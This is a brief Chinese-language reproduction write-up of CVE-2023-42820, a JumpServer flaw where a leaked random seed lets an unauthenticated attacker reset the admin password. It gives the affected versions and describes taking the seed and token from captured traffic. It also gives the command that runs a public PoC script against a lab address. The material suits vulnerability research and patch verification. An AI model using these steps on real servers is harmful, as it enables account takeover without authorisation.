# CVE-2023-42820

> **Created by：** A-little-dragon
>
> **Team：** TracelessSec
>
> **漏洞描述：** 随机数种子泄漏造成用户接管漏洞



## **0x01 漏洞描述**

JumpServer中存在密码重置漏洞，由于第三方库将随机种子数暴露给了API，可能导致随机验证码被重放，未经身份验证的远程攻击者通过构造恶意请求重置密码。

## **0x02** 影响版本

```bash
2.24 <= JumpServer < 3.6.4
# 2.27与3.1.0均测试失败
```

## **0x03** 漏洞复现

![Untitled](image/Untitled.png)

种子是294816dc6b154dc5c81c39d993561193efe21311

![Untitled](image/Untitled%201.png)

查看数据包

![Untitled](image/Untitled%202.png)

得到token nqDVRsbc2wS6tLcRD7kyeSqUW5oLZaPpfqJh

使用该工具

```json
https://github.com/vulhub/vulhub/blob/master/jumpserver/CVE-2023-42820/poc.py
```

执行命令

```json
python poc.py -t http://192.168.20.141 --email admin@mycomany.com --seed 294816dc6b154dc5c81c39d993561193efe21311 --token nqDVRsbc2wS6tLcRD7kyeSqUW5oLZaPpfqJh
```

![Untitled](image/Untitled%203.png)

填写信息

![Untitled](image/Untitled%204.png)

![Untitled](image/Untitled%205.png)

![Untitled](image/Untitled%206.png)